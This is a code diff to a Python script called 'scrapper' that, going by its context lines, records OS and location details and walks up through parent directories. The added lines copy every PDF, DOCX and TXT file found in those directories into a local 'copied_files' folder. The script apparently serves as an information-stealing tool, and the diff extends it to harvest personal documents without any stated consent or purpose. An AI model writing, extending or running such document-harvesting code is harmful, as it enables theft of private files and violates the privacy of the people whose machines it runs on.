@@ -6,6 +6,7 @@ import requests
 from datetime import datetime
 import os
 import psutil
+import shutil
 
 def get_os_info():
     return platform.platform()
@@ -95,10 +96,13 @@ def scrapper():
         for key, value in location_info.items():
             file.write(f"{key}: {value}\n")
         file.write("\n============================\n")
-
-        # Add directory navigation and listing
+    
         current_dir = os.getcwd()
         file.write(f"\nCurrent Directory: {current_dir}\n\n")
+
+        copied_files_dir = os.path.join(current_dir, 'copied_files')
+        if not os.path.exists(copied_files_dir):
+            os.makedirs(copied_files_dir)
 
         while True:
             try:
@@ -112,6 +116,10 @@ def scrapper():
                 file.write(f"Files in {prev_dir}:\n\n")
                 file_list = os.listdir(prev_dir)
                 for item in file_list:
+                    if item.endswith('.pdf') or item.endswith('.docx') or item.endswith('.txt'):
+                        src_file_path = os.path.join(prev_dir, item)
+                        dst_file_path = os.path.join(copied_files_dir, item)
+                        shutil.copy(src_file_path, dst_file_path)
                     file.write(f"{item}\n")
                 file.write("\n")
                 current_dir = prev_dir
